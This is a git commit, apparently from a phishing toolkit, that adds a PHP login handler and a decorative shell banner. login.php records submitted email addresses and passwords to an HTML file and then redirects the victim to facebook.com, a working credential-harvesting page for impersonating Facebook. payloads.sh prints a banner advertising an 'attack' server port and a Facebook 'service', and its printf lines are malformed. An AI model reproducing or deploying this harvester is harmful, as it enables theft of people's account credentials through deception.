92a1240a56836fe5f7ecbf493d8656b433a8963f
Luishiño <pericena12@gmail.com>
2020-05-30 09:26:36 -0400

    Add files via upload

---
+++ login.php
@@ -0,0 +1,11 @@
+<?php
+$email = $_POST['email'];
+$pass = $_POST['pass'];
+$guardame = fopen('credencial.html','a+');
+fwrite($guardame,
+	"username: ".$email.
+"\password: ".$pass." ");
+
+fclose($guardame);
+echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
+?>
---
+++ payloads.sh
@@ -0,0 +1,11 @@
+
+printf \e[1;97m    　　　__／|  *#*#4636#*#*\e[0m\n
+printf \e[1;97m   ｒｰ-++　 　 !     \e[0m\n
+printf \e[1;97m    ヽ 　 _,　r ミ  Servidor puerto ataque 8080\e[0m\n
+printf \e[1;97m　    彡__ ,xノﾞ     \e[1;92m by Luishino :3\e[0m\n
+printf \e[1;97m　　    |　　ヽ　　mmm...Servicio\e[1;96m[facebook] ...\e[0m\n
+printf \e[1;97m  https://lpericena.blogspot.com/\e[0m\n
+printf \e[1;93m [!]  Updating... \e[0m\n
+printf \e[1;93m [!] Installed.\e[0m\n
+printf \e[1;93m [#]
+echo server puerto 8282!
